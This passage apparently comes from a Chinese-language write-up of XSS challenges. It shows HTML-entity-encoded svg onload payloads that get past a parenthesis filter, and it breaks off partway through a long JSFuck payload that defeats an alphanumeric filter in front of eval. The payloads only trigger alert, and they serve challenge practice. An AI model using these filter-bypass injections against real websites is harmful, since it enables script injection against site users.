class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里主要是过滤了括号，用html实体编码绕过即可。</p><pre><code>alert(1337)&lt;========================================&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#51;&amp;#51;&amp;#55;&amp;#41;&lt;========================================&gt;&lt;svg onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#51;&amp;#51;&amp;#55;&amp;#41;&quot;&gt;&lt;========================================&gt;%3Csvg%20onload%3D%22%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2351%3B%26%2351%3B%26%2355%3B%26%2341%3B%22%3E</code></pre><h5 id="Ligma"><a href="#Ligma" class="headerlink" title="Ligma"></a>Ligma</h5><pre class="line-numbers language-html"><code class="language-html">balls = (new URL(location).searchParams.get('balls') || "Ninja has Ligma")balls = balls.replace(/[A-Za-z0-9]/g, '')eval(balls)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>过滤了大小写字母数字。是个<code>eval</code>直接用<code>jsfuck</code>绕过就好了，注意因为有些二义性字符要<code>url</code>编码。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token 